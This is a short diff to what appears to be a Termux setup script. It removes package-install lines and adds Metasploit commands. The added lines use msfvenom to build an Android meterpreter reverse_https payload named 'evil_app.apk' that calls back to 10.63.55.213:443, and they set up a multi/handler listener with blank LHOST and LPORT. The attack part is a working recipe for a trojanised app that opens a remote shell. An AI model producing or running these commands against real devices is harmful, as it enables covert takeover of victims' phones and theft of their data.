@@ -1,12 +1,8 @@
-#!/data/data/com.termux/files/usr/bash
+msfconsole 
 
-echo $(pkg updatte && pkg upgrade)
-echo $(pkg install python -y)
-echo $(pkg install termux-api -y)
-echo $(pkg install git -y)
-echo $(pkg install curl -y)
-echo $(pkg install wget -y)
-echo $(pkg install tmux -y)
-echo $(pkg install screen -y)
+msfvenom -p android/meterpreter/reverse_https LHOST=10.63.55.213 LPORT=443 -o evil_app.apk
 
-#en otro dia mejorare este porcierto todo esto en un archivo.sh y con los permisos x
+use exploit/multi/handler
+set payload android/meterpreter/reverse_https
+set LHOST =
+set LPORT =
